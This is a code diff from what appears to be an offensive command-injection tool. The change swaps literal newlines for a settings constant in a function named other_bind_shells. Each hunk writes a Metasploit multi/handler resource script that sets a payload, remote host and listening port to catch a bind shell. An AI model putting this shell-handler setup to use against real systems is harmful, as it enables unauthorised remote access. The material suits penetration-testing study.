@@ -125,17 +125,17 @@ def other_bind_shells(separator):
 
         with open (output, "r+") as content_file:
           data = content_file.readlines()
-          data = ''.join(data).replace("\n",settings.SINGLE_WHITESPACE)
+          data = ''.join(data).replace(settings.END_LINE.LF,settings.SINGLE_WHITESPACE)
 
         settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
-          filewrite.write("use exploit/multi/handler\n"
-                          "set payload " + payload + "\n"
-                          "set rhost "+ str(settings.RHOST) + "\n"
-                          "set lport "+ str(settings.LPORT) + "\n"
-                          "exploit\n\n")
+          filewrite.write("use exploit/multi/handler" + settings.END_LINE.LF + 
+                          "set payload " + payload + settings.END_LINE.LF +
+                          "set rhost "+ str(settings.RHOST) + settings.END_LINE.LF +
+                          "set lport "+ str(settings.LPORT) + settings.END_LINE.LF +
+                          "exploit" + settings.END_LINE.LF * 2)
 
         if settings.TARGET_OS == settings.OS.WINDOWS and not settings.USER_DEFINED_PHP_DIR:
           checks.set_php_working_dir()
@@ -216,17 +216,17 @@ def other_bind_shells(separator):
 
         with open (output, "r+") as content_file:
           data = content_file.readlines()
-          data = ''.join(data).replace("\n",settings.SINGLE_WHITESPACE)
+          data = ''.join(data).replace(settings.END_LINE.LF,settings.SINGLE_WHITESPACE)
 
         settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
-          filewrite.write("use exploit/multi/handler\n"
-                          "set payload " + payload + "\n"
-                          "set rhost "+ str(settings.RHOST) + "\n"
-                          "set lport "+ str(settings.LPORT) + "\n"
-                          "exploit\n\n")
+          filewrite.write("use exploit/multi/handler" + settings.END_LINE.LF + 
+                          "set payload " + payload + settings.END_LINE.LF +
+                          "set rhost "+ str(settings.RHOST) + settings.END_LINE.LF +
+                          "set lport "+ str(settings.LPORT) + settings.END_LINE.LF +
+                          "exploit" + settings.END_LINE.LF * 2)
 
         if settings.TARGET_OS == settings.OS.WINDOWS and not settings.USER_DEFINED_PHP_DIR:
           checks.set_php_working_dir()
@@ -267,11 +267,11 @@ def other_bind_shells(separator):
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
-          filewrite.write("use exploit/multi/handler\n"
-                          "set payload " + payload + "\n"
-                          "set rhost "+ str(settings.RHOST) + "\n"
-                          "set lport "+ str(settings.LPORT) + "\n"
-                          "exploit\n\n")
+          filewrite.write("use exploit/multi/handler" + settings.END_LINE.LF + 
+                          "set payload " + payload + settings.END_LINE.LF +
+                          "set rhost "+ str(settings.RHOST) + settings.END_LINE.LF +
+                          "set lport "+ str(settings.LPORT) + settings.END_LINE.LF +
+                          "exploit" + settings.END_LINE.LF * 2)
 
         if settings.TARGET_OS == settings.OS.WINDOWS:
           if not settings.USER_DEFINED_PYTHON_DIR:
